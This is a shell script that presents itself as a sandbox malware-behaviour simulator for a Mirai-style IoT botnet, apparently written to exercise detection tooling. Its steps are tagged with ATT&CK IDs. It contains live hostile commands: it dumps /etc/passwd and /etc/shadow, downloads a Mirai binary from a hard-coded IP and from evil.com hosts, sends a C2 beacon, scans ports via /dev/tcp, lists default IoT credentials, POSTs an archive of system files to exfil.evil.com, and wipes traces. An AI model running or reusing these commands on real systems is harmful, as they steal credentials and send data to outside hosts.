#!/bin/sh
# ShieldTier Malware Behavior Simulator — Mirai-style IoT botnet
# Safe to execute ONLY inside an isolated VM sandbox.
# Simulates real malware TTPs without destructive payloads.

# --- T1059.004: Unix Shell execution ---
export PATH=/bin:/sbin:/usr/bin:/usr/sbin

# --- T1082: System Discovery ---
HOSTNAME=$(hostname)
ARCH=$(uname -m)
KERNEL=$(uname -r)
echo "[bot] System: $HOSTNAME $ARCH $KERNEL"

# --- T1016: System Network Configuration Discovery ---
IFACE=$(ip -o link show 2>/dev/null | grep -v lo | head -1 | awk -F: '{print $2}' | tr -d ' ')
IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep inet | awk '{print $2}')
MAC=$(cat "/sys/class/net/$IFACE/address" 2>/dev/null || echo "unknown")
echo "[bot] Network: $IFACE IP=$IP MAC=$MAC"

# --- T1003: Credential Access ---
echo "[bot] Harvesting credentials..."
cat /etc/passwd > /tmp/.passwd_dump 2>/dev/null
cat /etc/shadow > /tmp/.shadow_dump 2>/dev/null
echo "[bot] Dumped passwd/shadow to /tmp"

# --- T1053.003: Cron persistence ---
echo "[bot] Installing persistence..."
echo "* * * * * /tmp/.mirai_persist" > /tmp/.cron_payload 2>/dev/null
cp "$0" /tmp/.mirai_persist 2>/dev/null
chmod +x /tmp/.mirai_persist 2>/dev/null
echo "[bot] Cron persistence installed"

# --- T1105: Remote File Download (will fail — network isolated) ---
echo "[bot] Downloading payload..."
wget -q -O /tmp/.update "http://185.234.72.19:8080/bins/mirai.arm7" 2>/dev/null &
WGET_PID=$!
curl -s -o /tmp/.update2 "http://malware-c2.evil.com/update" 2>/dev/null &
CURL_PID=$!

# --- T1071.001: C2 HTTP beacon ---
echo "[bot] Sending beacon to C2..."
wget -q -O /dev/null "http://185.234.72.19:8080/gate?id=$(hostname)&v=1.0" 2>/dev/null &

# --- T1046: Network Service Scanning ---
echo "[bot] Scanning local network..."
for port in 22 23 80 2323 8080; do
    for octet in 1 2 3 5 10 20; do
        (echo > /dev/tcp/10.0.2.$octet/$port) 2>/dev/null &
    done
done

# --- T1018: Remote System Discovery ---
echo "[bot] Enumerating hosts..."
for i in 1 2 3 4 5 10 20 50 100 200; do
    ping -c 1 -W 1 "10.0.2.$i" > /dev/null 2>&1 &
done

# --- T1110.001: Brute Force (simulated — just logs attempts) ---
CREDS="root:root root:admin admin:admin admin:password user:1234 guest:guest ubnt:ubnt support:support"
echo "[bot] Starting credential brute force..."
for cred in $CREDS; do
    USER=$(echo "$cred" | cut -d: -f1)
    PASS=$(echo "$cred" | cut -d: -f2)
    echo "[bot] Trying $USER:$PASS on telnet/ssh targets..." >> /tmp/.bruteforce.log
done

# --- T1041: Exfiltration Over C2 ---
echo "[bot] Exfiltrating data..."
tar czf /tmp/.exfil_data.tar.gz /etc/passwd /etc/hostname /tmp/.passwd_dump 2>/dev/null
wget -q --post-file=/tmp/.exfil_data.tar.gz "http://exfil.evil.com/upload" 2>/dev/null &

# --- T1070.004: File Deletion (anti-forensics) ---
echo "[bot] Cleaning traces..."
echo "" > /tmp/.bruteforce.log 2>/dev/null
rm -f /tmp/.passwd_dump /tmp/.shadow_dump 2>/dev/null

# --- T1497.001: Sandbox Evasion checks ---
echo "[bot] Checking environment..."
if [ -f /proc/1/cgroup ]; then
    grep -q docker /proc/1/cgroup 2>/dev/null && echo "[bot] Docker detected!" || true
fi
if [ -d /proc/scsi/scsi ]; then
    grep -qi "qemu\|virtio\|vbox" /proc/scsi/scsi 2>/dev/null && echo "[bot] VM detected!" || true
fi
CPUS=$(nproc 2>/dev/null || echo 1)
if [ "$CPUS" -le 1 ]; then
    echo "[bot] Single CPU — possible sandbox"
fi
MEM_KB=$(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print $2}')
if [ -n "$MEM_KB" ] && [ "$MEM_KB" -lt 1048576 ]; then
    echo "[bot] Low memory (<1GB) — possible sandbox"
fi

# --- T1057: Process Discovery ---
echo "[bot] Enumerating processes..."
ps aux > /tmp/.proc_list 2>/dev/null

# --- T1049: System Network Connections Discovery ---
netstat -tulnp > /tmp/.netstat 2>/dev/null || ss -tulnp > /tmp/.ss 2>/dev/null

# --- Fork child processes (T1106) ---
echo "[bot] Spawning worker processes..."
for i in 1 2 3; do
    (sleep 3 && echo "[worker $i] active" > "/tmp/.worker_$i") &
done

# Wait for network attempts to timeout
wait $WGET_PID 2>/dev/null
wait $CURL_PID 2>/dev/null

# --- Summary ---
echo ""
echo "[bot] === Execution Summary ==="
echo "[bot] Files created:"
ls -la /tmp/.* 2>/dev/null | grep -v '^\.' | head -20
echo "[bot] Active connections:"
netstat -an 2>/dev/null | grep -E "ESTABLISHED|SYN_SENT|TIME_WAIT" | head -10 || true
echo "[bot] Child processes:"
ps aux | grep -v grep | grep -E "sleep|wget|curl|ping" | head -10 || true
echo "[bot] === Done ==="

# Wait for children
wait 2>/dev/null
exit 0
